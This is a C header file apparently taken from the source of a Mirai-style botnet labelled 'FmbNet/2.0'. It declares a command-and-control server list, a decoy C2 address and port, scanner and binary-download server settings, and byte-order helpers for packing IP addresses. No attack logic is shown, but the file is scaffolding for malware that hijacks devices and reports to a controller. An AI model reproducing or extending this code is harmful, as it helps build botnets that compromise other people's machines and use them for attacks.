#pragma once

#include <unistd.h>
#include <signal.h>
#include <stdint.h>
#include <stdarg.h>
#include <sys/select.h>

#define STDIN   0
#define STDOUT  1
#define STDERR  2

#define FALSE   0
#define TRUE    1
typedef char BOOL;

typedef uint32_t ipv4_t;
typedef uint16_t port_t;

#if __BYTE_ORDER__ == __ORDER_BIG_ENDIAN__
#define NP_HTONL(x) ((uint32_t)(x))
#define NP_HTONS(x) ((uint16_t)(x))
#else
#define NP_HTONL(x) ((uint32_t)__builtin_bswap32((uint32_t)(x)))
#define NP_HTONS(x) ((uint16_t)__builtin_bswap16((uint16_t)(x)))
#endif

#define INET_ADDR(o1,o2,o3,o4) \
        NP_HTONL(((uint32_t)(o1) << 24) | ((uint32_t)(o2) << 16) | ((uint32_t)(o3) << 8) | (uint32_t)(o4))

#ifndef AF_ALG
#define AF_ALG 38
#endif
#ifndef SOL_ALG
#define SOL_ALG 279
#endif

struct cnc_addr {
    ipv4_t ip;
    port_t port;
};

extern struct cnc_addr CNC_LIST[];
#define CNC_LIST_SIZE 3

#define FAKE_CNC_ADDR INET_ADDR(65,222,202,53)
#define FAKE_CNC_PORT 80

#define CNC_IP_DEFAULT "127.0.0.1"
#define BINS_DOMAIN_DEFAULT "localhost"
#define SCANIP (int)inet_addr((const char*)"127.0.0.1")
#define SERVIP (int)inet_addr((const char*)"127.0.0.1")

#ifndef BOT_VERSION
#define BOT_VERSION "FmbNet/2.0"
#endif

extern ipv4_t LOCAL_ADDR;


